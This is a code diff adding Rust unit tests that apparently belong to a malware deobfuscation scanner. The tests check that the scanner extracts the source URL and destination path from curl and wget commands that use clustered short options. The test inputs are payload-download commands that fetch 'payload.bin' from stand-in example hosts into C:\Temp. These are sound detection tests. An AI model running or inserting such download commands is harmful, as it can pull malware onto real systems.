@@ -13641,6 +13641,27 @@ C:\Users\Public\cu.tmp -K curl.cfg
     }
 
     #[test]
+    fn curl_short_option_cluster_in_deob_text_emits_clean_destination() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"curl -fsSLo C:\Temp\payload.bin https://curl-cluster-deob.example/payload.bin"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://curl-cluster-deob.example/payload.bin"
+                        && dst.as_deref() == Some("C:\\Temp\\payload.bin")
+            )
+        });
+        assert!(
+            has,
+            "curl short-option cluster destination not recovered: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn curl_redirect_in_deob_text_emits_structured_download() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
@@ -13893,6 +13914,27 @@ C:\Users\Public\cu.tmp -K curl.cfg
         assert!(
             has,
             "wget -ODEST destination not recovered: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn wget_short_option_cluster_in_deob_text_emits_clean_destination() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"wget -qO C:\Temp\payload.bin https://wget-cluster-deob.example/payload.bin"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://wget-cluster-deob.example/payload.bin"
+                        && dst.as_deref() == Some("C:\\Temp\\payload.bin")
+            )
+        });
+        assert!(
+            has,
+            "wget short-option cluster destination not recovered: {:?}",
             env.traits
         );
     }
